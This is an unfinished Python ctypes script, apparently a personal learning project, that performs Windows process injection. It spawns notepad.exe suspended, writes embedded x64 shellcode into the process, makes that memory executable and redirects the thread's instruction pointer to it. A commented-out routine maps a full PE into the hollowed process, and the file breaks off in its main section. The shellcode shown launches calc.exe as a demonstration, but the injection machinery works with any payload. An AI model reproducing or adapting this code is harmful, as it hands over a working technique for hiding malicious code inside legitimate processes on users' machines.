"""
This is a mess... work in progress

First attempt tried to completely hollow out target process (notepad.exe)
Then write payload (cmd.exe) mapping headers and sections manually
However constantly met 0xc0000005 Access Violation issues
- despite different payloads (shellcode, executables) and target processes (to account for CFG, DEP etc)

However current workaround actually works.....
- Overwrites OriginalEntryPoint, and the Instruction Pointer register modified to point to this address
-> notepad.exe spawns suspended, shellcode written to spawn calc.exe
-> finally, python.exe -> notepad.exe, with calc.exe spawned as orphaned process

Works, but is messy
- not sure if technically 'Process Hollowing'
- NtUnmapViewOfSection() not called on target process, but OEP overwrite workaround
"""


import ctypes
from ctypes import wintypes
import msvcrt
import struct


kernel32    = ctypes.WinDLL('kernel32.dll', use_last_error=True)
ntdll       = ctypes.WinDLL('ntdll.dll',    use_last_error=True)


# ----------------------------------
# Payloads
# ----------------------------------

#payload=r"c:\windows\system32\calc.exe"
#payload = b"\xEB\xFE"  # (This is x64 for JMP $ — it just spins in place).


buf =  b"\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x20\x4c\x8b\x0e\x4d"
buf += b"\x8b\x09\x4d\x8b\x49\x20\xeb\x63\x41\x8b\x49\x3c\x4d\x31\xff\x41\xb7\x88\x4d\x01"
buf += b"\xcf\x49\x01\xcf\x45\x8b\x3f\x4d\x01\xcf\x41\x8b\x4f\x18\x45\x8b\x77\x20\x4d\x01"
buf += b"\xce\xe3\x3f\xff\xc9\x48\x31\xf6\x41\x8b\x34\x8e\x4c\x01\xce\x48\x31\xc0\x48\x31"
buf += b"\xd2\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xc2\x75\xda\x45"
buf += b"\x8b\x57\x24\x4d\x01\xca\x41\x0f\xb7\x0c\x4a\x45\x8b\x5f\x1c\x4d\x01\xcb\x41\x8b"
buf += b"\x04\x8b\x4c\x01\xc8\xc3\xc3\x41\xb8\x98\xfe\x8a\x0e\xe8\x92\xff\xff\xff\x48\x31"
buf += b"\xc9\x51\x48\xb9\x63\x61\x6c\x63\x2e\x65\x78\x65\x51\x48\x8d\x0c\x24\x48\x31\xd2"
buf += b"\x48\xff\xc2\x48\x83\xec\x28\xff\xd0"

# breakpoint before buffer
payload = buf +  b"\x90\x90\x90\xEB\xFE"

# infinite loop
# payload = b"\xEB\xFE"


# ----------------------------------
# CONSTANTS - functions
# ----------------------------------

# for CreateProcessW() - samples
CREATE_NEW_CONSOLE  = 0x10
CREATE_NO_WINDOW    = 0x08000000
DETACHED_PROCESS    = 0x08
CREATE_SUSPENDED    = 0x04


# for CONTEXT64() struct
CONTEXT_ALL     = 0x10001f 
CONTEXT_CONTROL = 0x100001 

# for IsWow64Process2() - for arch checking/cross-ref
IMAGE_FILE_MACHINE_UNKNOWN  = 0x0
IMAGE_FILE_MACHINE_I386     = 0x014c    # x86
IMAGE_FILE_MACHINE_AMD64    = 0x8664    # x64


# for SuspendThread() / ResumeThread()
INVALID_DWORD = 0xFFFFFFFF


# for VirtualAllocEx() / VirtualProtectEx ()
MEM_COMMIT              = 0x1000
MEM_RESERVE             = 0x2000
PAGE_NOACCESS           = 0x01
PAGE_READONLY           = 0x02
PAGE_READWRITE          = 0x04
PAGE_WRITECOPY          = 0x08
PAGE_EXECUTE            = 0x10
PAGE_EXECUTE_READ       = 0x20
PAGE_EXECUTE_READWRITE  = 0x40
PAGE_EXECUTE_WRITECOPY  = 0x80


# for VirtualFreeEx()
MEM_DECOMMIT                = 0x4000
MEM_RELEASE                 = 0x8000
MEM_COALESCE_PLACEHOLDERS   = 0x01
MEM_PRESERVE_PLACEHOLDER    = 0x02


# for WaitForSingleObject()
WAIT_OBJECT_0   = 0x000
WAIT_ABANDONED  = 0x080
WAIT_TIMEOUT    = 0x102
WAIT_FAILED     = 0xFFFFFFFF


# for NtUnmapViewOfSection() - signed long values, for returned error codes
STATUS_SUCCESS                  = 0
STATUS_INVALID_HANDLE           = -1073741816
STATUS_INVALID_PARAMETER        = -1073741811
STATUS_NOT_MAPPED_VIEW          = -1073741799   # ref base address
STATUS_ACCESS_DENIED            = -1073741790
STATUS_PROCESS_IS_TERMINATING   = -1073741558
STATUS_INVALID_ADDRESS          = -1073741503




# ----------------------------------
# CONSTANTS - PE file layout
# ----------------------------------

# ----- DOS e_lfanew offset ----- ptr to start of PE Header
PE_OFFSET                   = 0x3C  # 4 bytes

# ----- PE Signature ----- 
PE_SIGNATURE_SIZE           = 4

# ----- IMAGE_FILE_HEADER ----- 
FILE_HDR_SIZE               = 20

FILE_HDR_MACHINE            = 0x00  # 2 bytes
FILE_HDR_NUM_SECTIONS       = 0x02  # 2 bytes
FILE_HDR_TIMESTAMP          = 0x04  # 4 bytes
FILE_HDR_PTR_SYMBOL_TABLE   = 0x08  # 4 bytes
FILE_HDR_NUM_SYMBOLS        = 0x0C  # 4 bytes
FILE_HDR_SIZE_OF_OPT_HDR    = 0x10  # 2 bytes
FILE_HDR_CHARACTERISTICS    = 0x12  # 2 bytes

# ----- IMAGE_OPTIONAL_HEADER (samples) ----- 
OPT_HDR_MAGIC               = 0x00  # 2 bytes
OPT_HDR_ENTRY_POINT         = 0x10  # 4 bytes, Relative Virtual Address (RVA) of entry point
OPT_HDR_IMAGE_BASE          = 0x18  # 4 bytes 
OPT_HDR_SIZE_OF_IMAGE       = 0x38  # 4 bytes
OPT_HDR_SIZE_OF_HEADERS     = 0x3C  # 4 bytes

# ----- IMAGE_SECTION_HEADER ----- 
SECTION_HEADER_SIZE = 40            # 40 byte header size

SEC_HDR_NAME                = 0x00  # 8 bytes
SEC_HDR_VIRTUAL_SIZE        = 0x08  # 4 bytes
SEC_HDR_VIRTUAL_ADDRESS     = 0x0C  # 4 bytes
SEC_HDR_SIZE_OF_RAW_DATA    = 0x10  # 4 bytes
SEC_HDR_PTR_TO_RAW_DATA     = 0x14  # 4 bytes
SEC_HDR_PTR_TO_RELOC        = 0x18  # 4 bytes
SEC_HDR_LINENO_PTR          = 0x1C  # 4 bytes  
SEC_HDR_RELOC_COUNT         = 0x20  # 2 bytes  
SEC_HDR_LINENO_COUNT        = 0x22  # 2 bytes  
SEC_HDR_CHARACTERISTICS     = 0x24  # 4 bytes

# ----- DATA DIRECTORIES ----- 
DATA_DIRECTORY_SIZE         = 8
NUM_DATA_DIRECTORIES        = 16





# ----------------------------------
# Struct Definitions
# ----------------------------------

class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("nLength",                 wintypes.DWORD),
        ("lpSecurityDescriptor",    wintypes.LPVOID),
        ("bInheritHandle",          wintypes.BOOL),
    ]

class STARTUPINFOW(ctypes.Structure):
    _fields_ = [
        ("cb",                wintypes.DWORD),
        ("lpReserved",        wintypes.LPWSTR),
        ("lpDesktop",         wintypes.LPWSTR),
        ("lpTitle",           wintypes.LPWSTR),
        ("dwX",               wintypes.DWORD),
        ("dwY",               wintypes.DWORD),
        ("dwXSize",           wintypes.DWORD),
        ("dwYSize",           wintypes.DWORD),
        ("dwXCountChars",     wintypes.DWORD),
        ("dwYCountChars",     wintypes.DWORD),
        ("dwFillAttribute",   wintypes.DWORD),
        ("dwFlags",           wintypes.DWORD),
        ("wShowWindow",       wintypes.WORD),
        ("cbReserved2",       wintypes.WORD),
        ("lpReserved2",       wintypes.LPBYTE),
        ("hStdInput",         wintypes.HANDLE),
        ("hStdOutput",        wintypes.HANDLE),
        ("hStdError",         wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess",    wintypes.HANDLE),
        ("hThread",     wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId",  wintypes.DWORD),    
    ]

class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
    ("Reserved1",       ctypes.c_void_p),
    ("PebBaseAddress",  ctypes.c_void_p),
    ("Reserved2",       ctypes.c_void_p * 2),
    ("UniqueProcessId", ctypes.c_void_p),
    ("Reserved3",       ctypes.c_void_p),
    ]

class M128A(ctypes.Structure):
    _pack_ = 16
    _fields_ = [
        ("Low", ctypes.c_uint64),
        ("High", ctypes.c_int64),
    ]

class CONTEXT64(ctypes.Structure):
    _pack_ = 16
    _fields_ = [
        # Home Addresses (48 bytes)
        ("P1Home", ctypes.c_uint64), ("P2Home", ctypes.c_uint64),
        ("P3Home", ctypes.c_uint64), ("P4Home", ctypes.c_uint64),
        ("P5Home", ctypes.c_uint64), ("P6Home", ctypes.c_uint64),
        
        ("ContextFlags", wintypes.DWORD),
        ("MxCsr", wintypes.DWORD),
        
        ("SegCs", wintypes.WORD), ("SegDs", wintypes.WORD),
        ("SegEs", wintypes.WORD), ("SegFs", wintypes.WORD),
        ("SegGs", wintypes.WORD), ("SegSs", wintypes.WORD),
        ("EFlags", wintypes.DWORD),
        
        # This padding is required to force Dr0 to offset 80
        ("Padding", wintypes.DWORD), 
        
        ("Dr0", ctypes.c_uint64), ("Dr1", ctypes.c_uint64), 
        ("Dr2", ctypes.c_uint64), ("Dr3", ctypes.c_uint64), 
        ("Dr6", ctypes.c_uint64), ("Dr7", ctypes.c_uint64),
        
        # Integer Registers (Rax at 128)
        ("Rax", ctypes.c_uint64), ("Rcx", ctypes.c_uint64), 
        ("Rdx", ctypes.c_uint64), ("Rbx", ctypes.c_uint64),
        ("Rsp", ctypes.c_uint64), ("Rbp", ctypes.c_uint64),
        ("Rsi", ctypes.c_uint64), ("Rdi", ctypes.c_uint64),
        ("R8",  ctypes.c_uint64), ("R9",  ctypes.c_uint64), 
        ("R10", ctypes.c_uint64), ("R11", ctypes.c_uint64),
        ("R12", ctypes.c_uint64), ("R13", ctypes.c_uint64), 
        ("R14", ctypes.c_uint64), ("R15", ctypes.c_uint64), 
        
        # More padding
        ("AlignPadding2", ctypes.c_uint64),
        
        # RIP is now at 264
        ("Rip", ctypes.c_uint64), 
        
        # Floating point (512 bytes)
        ("FltSave", M128A * 32),
        
        # Vector registers (Exactly 26 elements)
        ("VectorRegister", M128A * 25),
        ("VectorControl", ctypes.c_uint64),

        ("DebugControl", ctypes.c_uint64),
        ("LastBranchToRip", ctypes.c_uint64),
        ("LastBranchFromRip", ctypes.c_uint64),
        ("LastExceptionToRip", ctypes.c_uint64),
        ("LastExceptionFromRip", ctypes.c_uint64),
    ]

# ----------------------------------
# Function Prototypes
# ----------------------------------

# ------------------- kernel32.dll -------------------
kernel32.CloseHandle.argtypes = [ wintypes.HANDLE, ]  # hObject
kernel32.CloseHandle.restype = wintypes.BOOL


kernel32.CreateProcessW.argtypes = [
    wintypes.LPCWSTR,                       # lpApplicationName (opt)
    wintypes.LPWSTR,                        # [i/o] lpCommandLine (opt)
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpProcessAttributes (opt)
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpThreadAttributes (opt)
    wintypes.BOOL,                          # bInheritHandles
    wintypes.DWORD,                         # dwCreationFlags
    ctypes.c_void_p,                        # lpEnvironment (opt)
    wintypes.LPCWSTR,                       # lpCurrentDirectory (opt)
    ctypes.POINTER(STARTUPINFOW),           # lpStartupInfo
    ctypes.POINTER(PROCESS_INFORMATION),    # [o] lpProcessInformation
]
kernel32.CreateProcessW.restype = wintypes.BOOL


kernel32.CreateRemoteThread.argtypes = [
    wintypes.HANDLE,                        # hProcess
    ctypes.POINTER(SECURITY_ATTRIBUTES),    # lpThreadAttributes
    ctypes.c_size_t,                        # dwStackSize
    wintypes.LPVOID,                        # lpStartAddress, ptr to thread function
    wintypes.LPVOID,                        # lpParameter, arg to thread function
    wintypes.DWORD,                         # dwCreationFlags, CREATE_SUSPENDED etc
    ctypes.POINTER(wintypes.DWORD),         # [o] lpThreadId (opt)
]
kernel32.CreateRemoteThread.restype = wintypes.HANDLE


kernel32.GetThreadContext.argtypes = [
    wintypes.HANDLE,                    # hThread
    ctypes.POINTER(CONTEXT64),          # lpContext
]
kernel32.GetThreadContext.restype = wintypes.BOOL

kernel32.IsWow64Process2.argtypes = [
    wintypes.HANDLE,                    # hProcess
    ctypes.POINTER(wintypes.USHORT),    # [o] pProcessMachine
    ctypes.POINTER(wintypes.USHORT),    # [o] pNativeMachine (opt)
]
kernel32.IsWow64Process2.restype = wintypes.BOOL


kernel32.ReadProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPCVOID,                   # lpBaseAddress
    wintypes.LPVOID,                    # [o] lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] lpNumberOfBytesRead
]
kernel32.ReadProcessMemory.restype = wintypes.BOOL


kernel32.ResumeThread.argtypes = [wintypes.HANDLE,]    # hThread
kernel32.ResumeThread.restype = wintypes.DWORD


kernel32.SetThreadContext.argtypes = [
    wintypes.HANDLE,            # hThread
    ctypes.POINTER(CONTEXT64),  # *lpContext
]
kernel32.SetThreadContext.restype = wintypes.BOOL


kernel32.SuspendThread.argtypes = [wintypes.HANDLE,]    # hThread
kernel32.SuspendThread.restype = wintypes.DWORD


kernel32.VirtualAllocEx.argtypes = [
    wintypes.HANDLE,        # hProcess
    wintypes.LPVOID,        # lpAddress (opt) (can be null)
    ctypes.c_size_t,        # dwSize
    wintypes.DWORD,         # flAllocationType
    wintypes.DWORD,         # flProtect
]
kernel32.VirtualAllocEx.restype = ctypes.c_void_p


kernel32.VirtualFreeEx.argtypes = [
    wintypes.HANDLE,    # hProcess
    wintypes.LPVOID,    # lpAddress, ptr to starting address of memory to free
    ctypes.c_size_t,    # dwSize, (set 0 if MEM_RELEASE)
    wintypes.DWORD,     # dwFreeType (see CONSTANTS)
]
kernel32.VirtualFreeEx.restype = wintypes.BOOL


kernel32.VirtualProtectEx.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPVOID,                    # lpAddress
    ctypes.c_size_t,                    # dwSize
    wintypes.DWORD,                     # flNewProtect (see CONSTANTS)
    ctypes.POINTER(wintypes.DWORD),     # [o] lpflOldProtect
]
kernel32.VirtualProtectEx.restype = wintypes.BOOL


kernel32.WriteProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPVOID,                    # lpBaseAddress
    wintypes.LPCVOID,                   # lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] *lpNumberOfBytesWritten
]
kernel32.WriteProcessMemory.restype = wintypes.BOOL


# ------------------- ntdll.dll -------------------
ntdll.NtQueryInformationProcess.argtypes = [
        wintypes.HANDLE,                # ProcessHandle
        ctypes.c_int,                   # ProcessInformationClass
        ctypes.c_void_p,                # [o] ProcessInformation
        ctypes.c_ulong,                 # ProcessInformationLength
        ctypes.POINTER(ctypes.c_ulong), # [o] ReturnLength (opt)
]
ntdll.NtQueryInformationProcess.restype = ctypes.c_long


ntdll.NtUnmapViewOfSection.argtypes = [
    wintypes.HANDLE,        # ProcessHandle
    ctypes.c_void_p,        # BaseAddress (opt)
]
ntdll.NtUnmapViewOfSection.restype = ctypes.c_long




# ----------------------------------
# Function Definitions
# ----------------------------------


# --------------- PE parser helper functions ---------------
# e_lfanew ->   [PE Signature       - 4 bytes]
#               [File Header        - 20 bytes]
#               [Optional Header    - variable]
#               [Section Table      - no Sections x 40bytes]

def get_pe_header_offset(f: object) -> int:
    f.seek(PE_OFFSET)
    return struct.unpack('<I', f.read(4))[0]

def get_file_header_offset(pe_offset: int) -> int:
    return pe_offset + PE_SIGNATURE_SIZE

def get_optional_header_offset(pe_offset: int) -> int:
    return pe_offset + PE_SIGNATURE_SIZE + FILE_HDR_SIZE

def get_section_table_offset(pe_offset: int, size_of_optional_header: int) -> int:
    return pe_offset + PE_SIGNATURE_SIZE + FILE_HDR_SIZE + size_of_optional_header

def get_entry_point_rva(payload_path: str) -> int:
    """ 
    Return the Relative Virtual Address (RVA) of the on-disk binary
    - ie, AddressOfEntryPoint field, within Optional Header
    - not an absolute memory address -> RELATIVE to the image base

    To get actual executable entrypoint in memory
    - OEP = image_base_address + oep_rva
    """
    
    
    print(f"\n[+] Extracting Original Entry Point, Relative Virtual Address:")
    print(f"    -> Payload: {payload_path}")

    with open(payload_path, 'rb') as f:
        pe_offset = get_pe_header_offset(f)
        opt_hdr_offset = get_optional_header_offset(pe_offset)
        f.seek(opt_hdr_offset + OPT_HDR_ENTRY_POINT)

        oep_rva = struct.unpack('<I', f.read(4))[0]
        print(f"    -> oep_rva: {hex(oep_rva)}")

    return oep_rva



# --------------- Misc help functions ---------------


def winerr() -> OSError:
    """ Return a ctypes.WinError() with the last Windows API error """
    return ctypes.WinError(ctypes.get_last_error())


def close_handle(handle: wintypes.HANDLE, name: str="Handle") -> None:
    """ Close open handles, to avoid resource leaks """

    print(f"[+] Closing Handle {handle.value} to {name}: ", end='', flush=True)

    if handle is None or handle.value == 0:
        print(f"[!] Warning: {name} is None or invalid, nothing to close")
        return

    if not kernel32.CloseHandle(handle):
        print(f"Failed! Error: {winerr()}")
    else:
        print(f"Successful")


def pause(warning=False) -> None:
    """ Pause until user key press (any) """

    if warning:
        print("\n\n[!] WARNING: About to execute payload: Press any key to continue...", end='', flush=True)
    else:
        print("\n\nPress any key to continue...", end='', flush=True)

    msvcrt.getch()
    print()


def debug_cpu_registers() -> None:
    """
    CONTEXT64() struct used to hold a snapshot of a thread's processor state
    - here we debug to confirm proper struct size and register offsets
    - due to persistent 0xc000000005 Access Violation errors when calling ResumeThread()
    """
    
    print(f"\n[+] DEBUG: CONTEXT64() struct and CPU register offset info:")
    print(f"    -> Struct size: {ctypes.sizeof(CONTEXT64)} (Expected: 1232)")
    print(f"    -> Dr0 Offset: {CONTEXT64.Dr0.offset} (Expected: 80 or 96)")
    print(f"    -> Rax Offset: {CONTEXT64.Rax.offset} (Expected: 128 or 144)")
    print(f"    -> Rip Offset: {CONTEXT64.Rip.offset} (Expected: 264)")

    pause()


# -----------------------------------------------------------------


def create_process(
    app: str=r"c:\windows\system32\notepad.exe",
    flags: int=None
) -> tuple[wintypes.HANDLE, wintypes.HANDLE,
           wintypes.DWORD, wintypes.DWORD]:

    hdr = "\n >>>>    Creating SUSPENDED Process -> CreateProcessW()    <<<<\n"
    print("\n" + "-"*len(hdr) + hdr + "-" *len(hdr))


    # define args
    lpApplicationName = app
    lpCommandLine = None
    lpProcessAttributes = None
    lpThreadAttributes = None
    bInheritHandles = False
    dwCreationFlags = flags
    lpEnvironment = None
    lpCurrentDirectory = None

    lpStartupInfo = STARTUPINFOW()
    lpStartupInfo.cb = ctypes.sizeof(STARTUPINFOW)
    lpProcessInformation = PROCESS_INFORMATION()

    # spawn process
    try:
        if not kernel32.CreateProcessW(
            lpApplicationName,
            lpCommandLine,
            lpProcessAttributes, 
            lpThreadAttributes, 
            bInheritHandles, 
            dwCreationFlags, 
            lpEnvironment, 
            lpCurrentDirectory, 
            ctypes.byref(lpStartupInfo), 
            ctypes.byref(lpProcessInformation)
        ):
            raise winerr()

        print(f"-> Process created: {lpApplicationName}")
        
        # return handles/Ids to thread and process
        hThread = wintypes.HANDLE(lpProcessInformation.hThread)
        hProcess = wintypes.HANDLE(lpProcessInformation.hProcess)  
        dwThreadId = lpProcessInformation.dwThreadId
        dwProcessId = lpProcessInformation.dwProcessId
        
        return hThread, hProcess, dwThreadId, dwProcessId
        
    except OSError as e:
        raise OSError(f"\n[!] CreateProcessW() Failed, Application: {app}, Error: {e}")




def get_base_addr(hProcess: wintypes.HANDLE) -> ctypes.c_void_p:

    print(f"\n[+] Retrieving Process Basic Information: NtQueryInformationProcess()")
    
    pbi = PROCESS_BASIC_INFORMATION()
    return_len = ctypes.c_ulong()
    ProcessInformationClass = 0 # return ProcessBasicInformation
    
    status = ntdll.NtQueryInformationProcess(
        hProcess,
        ProcessInformationClass, 
        ctypes.byref(pbi),
        ctypes.sizeof(pbi),
        ctypes.byref(return_len)
    )
    
    if status != 0:
        print(f"[!] Failed to query process info: {hex(status & 0xFFFFFFFF)}")
        raise winerr()
    
    print(f"    -> PBI retrieved...")


    print(f"\n[+] Retrieving Image Base Address: ReadProcessMemory()")

    # pointer to PEB
    peb_addr = pbi.PebBaseAddress
    
    # read ImageBaseAddress from PEB
    # assuming 64-bit python/target, offset @ 0x10
    image_base = ctypes.c_void_p()
    ptr_size = ctypes.sizeof(ctypes.c_void_p)
    image_base_offset = peb_addr + (ptr_size * 2)


    kernel32.ReadProcessMemory(
        hProcess,
        image_base_offset,          # lpBaseAddress
        ctypes.byref(image_base),   # [o] lpBuffer
        ptr_size,
        None
    )

    print(f"    -> img_base_addr at: {hex(image_base.value)}")

    return image_base.value




def hollow_process(
            hProcess: wintypes.HANDLE,
            base_address: ctypes.c_void_p
) -> None:
    """ Unmap ('hollow out') the memory address space of target process """

    if not base_address or base_address == 0:
        print("[!] Invalid base address, skipping unmapping")
        return

    print(f"\n[+] Un-mapping process memory: NtUnmapViewOfSection()")

    status = ntdll.NtUnmapViewOfSection(hProcess, base_address)

    if status != 0:
        print(f"[!] Failed, Status Code: {status}")
        raise winerr()
        
    print(f"-> hollowed-out target memory at: {hex(base_address)}")




def get_sizeof_image(file_path: str) -> int:
    """
    Retrieve SizeOfImage -> memory size (bytes) that must be reserved/committed to load executable, and all its sections
    - footprint of file in virtual memory, NOT the file size on disk
    - ie SizeOfImage > SizeOfFileOnDisk
    - field exists within Optional Header, @ 56-byte (0x38) offset
    """    

    with open(file_path, 'rb') as f:

        # 1. Jump to end of DOS header (0x3C), read last field 'e_lfanew'
        pe_offset = get_pe_header_offset(f)

        # 2. Jump to start of Optional Header
        opt_hdr_offset = get_optional_header_offset(pe_offset)
        
        # 3. SizeOfImage at Offset 56 within Optional Header
        size_of_image_offset = opt_hdr_offset + OPT_HDR_SIZE_OF_IMAGE
        
        f.seek(size_of_image_offset)
        size_of_image = struct.unpack('<I', f.read(4))[0]
        
        return size_of_image




def virtual_alloc_ex(
    hProcess: wintypes.HANDLE,
    lpAddress: ctypes.c_void_p,
    dwSize: ctypes.c_size_t
) -> wintypes.LPVOID:

    hdr = "\n>>>>    Allocating Memory -> VirtualAllocEx()    <<<<\n"
    print("\n" + "-" *len(hdr) + hdr + "-" *len(hdr))
    
    ptr = kernel32.VirtualAllocEx(hProcess,
                            lpAddress,
                            dwSize,
                            MEM_COMMIT | MEM_RESERVE,
                            PAGE_READWRITE)

    if not ptr:
        raise winerr()
    
    print(f"->  base address: {hex(ptr)}")
    
    return ptr




'''
def write_payload(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: wintypes.LPVOID,
    payload_path: str):

    with open(payload_path, 'rb') as f:
        """
        This block attempts to write another .exe into the space of the unmapped/hollowed out target process
        - maps headers + each section of the PE file
        
        Uunpacks PE headers -> then parses
        - [PE Header] [File Header] [Optional Header] [Section Table (array of Section Headers)]
        """

        # 1. Get all header offsets
        pe_offset           = get_pe_header_offset(f)               # 1 
        file_header_offset  = get_file_header_offset(pe_offset)     # 2
        opt_hdr_offset      = get_optional_header_offset(pe_offset) # 3

        f.seek(file_header_offset + FILE_HDR_SIZE_OF_OPT_HDR)
        size_of_opt_header = struct.unpack('<H', f.read(2))[0]
        section_table_offset = get_section_table_offset(pe_offset, size_of_opt_header) #4


        # Map headers
        f.seek(opt_hdr_offset + OPT_HDR_SIZE_OF_HEADERS)
        size_of_headers = struct.unpack('<I', f.read(4))[0]

        f.seek(0)
        header_data = f.read(size_of_headers)

        kernel32.WriteProcessMemory(
            hProcess, 
            ctypes.c_void_p(lpBaseAddress), 
            header_data, 
            size_of_headers, 
            None    # lpNumberOfBytesWritten (optional)
        )



        # Map Sections
        # - the Section Table, is an array of Section Headers
        # - section[S] will include .text, .data, .rsrc, .reloc etc

        f.seek(file_header_offset + FILE_HDR_NUM_SECTIONS) # NumberOfSections
        num_sections = struct.unpack('<H', f.read(2))[0]
        
        for i in range(num_sections):

            # iterate through each Section Header in the Section Table[]
            entry_offset = section_table_offset + (i * SECTION_HEADER_SIZE)
            
            # read name of the section (.data, .text etc)
            f.seek(entry_offset)
            name_bytes = f.read(8)
            section_name = name_bytes.split(b'\x00')[0].decode(errors='ignore')
            
            # read VirtualAddress, RawDataSize and RawDataPointer info (Offsets 12, 16, 20)
            # virt_addr -> where section will be loaded into target-process' virtual memory
            # raw_size  -> size of raw data (how much data to copy)
            # raw_ptr   -> offset within file, where section's raw data begins
            
            f.seek(entry_offset + SEC_HDR_VIRTUAL_ADDRESS)
            virt_addr, raw_size, raw_ptr = struct.unpack('<III', f.read(12))
            
            # actual mapping of section -> target process' memory
            # raw data (@ raw_ptr) read from disk -> written to allocated memory of target process
            if raw_size > 0:
                # jump to the code/data on disk
                f.seek(raw_ptr)
                section_bytes = f.read(raw_size)
                
                # Destination = Target Base + Virtual Off   set
                dest = lpBaseAddress + virt_addr
                
                kernel32.WriteProcessMemory(
                    hProcess, 
                    ctypes.c_void_p(dest), 
                    section_bytes, 
                    raw_size, 
                    None    # lpNumberOfBytesWritten (optional)
                )

                print(f"Mapped section {section_name:10} -> {hex(dest)} (size: {hex(raw_size)})")
'''




def write_payload(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: int,
    shellcode: bytes
) -> None:
    """ Writes raw shellcode bytes directly into the target process memory. """
    print(f"\n[+] Writing shellcode payload -> WriteProcessMemory()")
    print(f"-> Destination Address: {hex(lpBaseAddress)}")
    print(f"-> Shellcode Size:      {len(shellcode)} bytes")

    n_written = ctypes.c_size_t(0)

    # Use WriteProcessMemory to copy the shellcode bytes directly
    if not kernel32.WriteProcessMemory(
        hProcess,
        lpBaseAddress,       # Target address from VirtualAllocEx
        shellcode,           # The raw byte string (e.g., b"\xfc\x48...")
        len(shellcode),      # Size of the shellcode
        ctypes.byref(n_written)
    ):
        raise winerr()

    print(f"-> bytes written: {n_written.value}")




def redirect_to_payload(
        hThread: wintypes.HANDLE,
        lpBaseAddress: int,
        payload_path = str) -> None:

    """
    Update GetThreadContext() to point CPU to new payload entry point
    """

    '''
        # get RVA and ABSOLUTE entry points from payload
        entry_point_rva = get_entry_point(payload_path)
        absolute_entry = lpBaseAddress + entry_point_rva

        print(f"\n[+] Extracting entry point RVA from: {payload_path}")
        print(f"-> Entry Point RVA: {hex(entry_point_rva)}")
        print(f"-> Absolute Entry:   {hex(absolute_entry)}")
    '''


    # current CPU state
    # ctx = CONTEXT64()
    # ctx.ContextFlags = CONTEXT_ALL

    # Allocate 16 extra bytes to ensure we can find a 16-byte aligned start
    raw_buffer = ctypes.create_string_buffer(ctypes.sizeof(CONTEXT64) + 16)
    
    # Calculate the first address divisible by 16
    raw_addr = ctypes.addressof(raw_buffer)
    aligned_addr = (raw_addr + 15) & ~15
    
    # Map the structure onto that specific memory address
    ctx = CONTEXT64.from_address(aligned_addr)
    ctx.ContextFlags = CONTEXT_ALL # 0x10001f

    print(f"\n[_] Reading current CPU state...", end='')

    if not kernel32.GetThreadContext(hThread, ctypes.byref(ctx)):
        raise winerr()
    print(f"-> Original RIP: {hex(ctx.Rip)}")


    # redirect CPU to new entry point
    ctx.Rip = lpBaseAddress
    print(f"-> New RIP set to: {hex(ctx.Rip)}")

    # Ensure Rsp ends in 0 (16-byte aligned)
    ctx.Rsp = (ctx.Rsp & ~0xF) - 0x20  # Align and add "Shadow Space"
    print(f"-> New RSP (Aligned): {hex(ctx.Rsp)}")

    # apply the changes
    print(f"\n[+] Redirecting CPU Instruction Pointer to new payload -> GetThreadContext()")
    
    if not kernel32.SetThreadContext(hThread, ctypes.byref(ctx)):
        raise winerr()
    print(f"-> Successful:")



def  modify_memory_protection(
    hProcess: wintypes.HANDLE,
    lpAddress: wintypes.LPVOID,
    dwSize: int,
    flNewProtect: int=PAGE_EXECUTE_READ
) -> int:

    """
    Modify memory protection setting
    - initally set to PAGE_READWRITE -> VirtualAllocEx(RW)
    - here, re-set to PAGE_EXECUTE_READ (RW -> RX) after payload written
    
    Note: after execution, re-called to reset previous setting (RX -> RW)
    """
    
    print(f"\n[+] Modifying status of memory protection -> VirtualProtectEx()")

    lpflOldProtect = wintypes.DWORD()

    if not kernel32.VirtualProtectEx(
        hProcess,
        lpAddress,
        dwSize,
        flNewProtect,
        ctypes.byref(lpflOldProtect)
    ):
        raise winerr()

    PROTECT_STATUS_MAP = {
        0x1000: "MEM_COMMIT",
        0x2000: "MEM_RESERVE", 
        0x01:   "PAGE_NOACCESS", 
        0x02:   "PAGE_READONLY",
        0x04:   "PAGE_READWRITE",
        0x08:   "PAGE_WRITECOPY",
        0x10:   "PAGE_EXECUTE",
        0x20:   "PAGE_EXECUTE_READ",
        0x40:   "PAGE_EXECUTE_READWRITE",
        0x80:   "PAGE_EXECUTE_WRITECOPY",
    }

    old_val = lpflOldProtect.value
    new_val = flNewProtect
    
    old = PROTECT_STATUS_MAP.get(old_val, f"Unknown Code: ({hex(old_val)})")
    new = PROTECT_STATUS_MAP.get(new_val, f"Unknown Code: ({hex(new_val)})")

    print(f"-> Old status: {old} ({hex(old_val)})")
    print(f"-> New status: {new} ({hex(new_val)})")

    return lpflOldProtect.value



def resume_orig_process(
    hThread: wintypes.HANDLE,
    dwThreadId: wintypes.DWORD,
    dwProcessId: wintypes.DWORD
) -> None:
    
    """ Resume execution of original process/thread """

    print(f"\n[+] Resuming original thread:")
    print(f"-> ProcessId: {dwProcessId}")
    print(f"-> ThreadId: {dwThreadId}")
    
    kernel32.ResumeThread(hThread)




##########################################
##### Main functionality starts here #####
##########################################


# show state of CPU registers and struct info
debug_cpu_registers()


# ----------------------------------
# Create Suspended Process (defult, notepad.exe)
# ----------------------------------

# create target process <- return handle/Ids to thread/process
hThread, hProcess, dwThreadId, dwProcessId = create_process(flags=CREATE_SUSPENDED)

# return base address, of where target process is loaded
img_base_addr = get_base_addr(hProcess)

# hollow out target process
